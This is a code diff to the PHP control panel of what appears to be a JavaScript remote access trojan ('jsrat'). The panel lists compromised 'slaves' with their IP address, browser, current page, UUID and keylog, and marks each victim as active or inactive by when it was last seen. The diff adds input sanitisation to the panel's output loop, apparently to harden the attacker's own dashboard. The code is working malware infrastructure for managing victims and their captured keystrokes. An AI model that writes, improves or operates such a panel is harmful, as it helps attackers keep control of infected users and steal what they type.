@@ -28,17 +28,20 @@ $slaves = $db->table('slaves')->order('lastSeen', 'dec')->get();
           <?php
           $i = 1;
           foreach($slaves as $key => $val) {
-						$browser = (new jsrat)->getBrowser($val['ua']);
-						$active = ((time() - $val['lastSeen']) > 70 )?'color:red;':'color:green;';
-						echo "<tr onclick=\"manageSlave('{$val['uuid']}', '{$val['keylog']}');\" style=\"cursor:pointer;\" class=\"slave\" id=\"{$val['uuid']}\">";
-						echo "<th scope='row'>{$i}</th>";
-						echo "<td style=\"{$active}\">{$val['ip']}</td>";
-						echo "<td>{$browser['name']}</td>";
-						echo "<td>{$val['page']}</td>";
-						echo "<td>{$val['uuid']}</td>";
-						echo "<td><a href='index.php?delete={$val['uuid']}'>Delete</a></td>";
-						echo "</tr>";
-						$i++;
+		foreach($val as $k => $v) {
+			$val[$k] = filter_var($v, FILTER_SANITIZE_STRING);
+		}
+		$browser = (new jsrat)->getBrowser($val['ua']);
+		$active = ((time() - $val['lastSeen']) > 70 )?'color:red;':'color:green;';
+		echo "<tr onclick=\"manageSlave('{$val['uuid']}', '{$val['keylog']}');\" style=\"cursor:pointer;\" class=\"slave\" id=\"{$val['uuid']}\">";
+		echo "<th scope='row'>{$i}</th>";
+		echo "<td style=\"{$active}\">{$val['ip']}</td>";
+		echo "<td>{$browser['name']}</td>";
+		echo "<td>{$val['page']}</td>";
+		echo "<td>{$val['uuid']}</td>";
+		echo "<td><a href='index.php?delete={$val['uuid']}'>Delete</a></td>";
+		echo "</tr>";
+		$i++;
           }
           ?>
         </tbody>
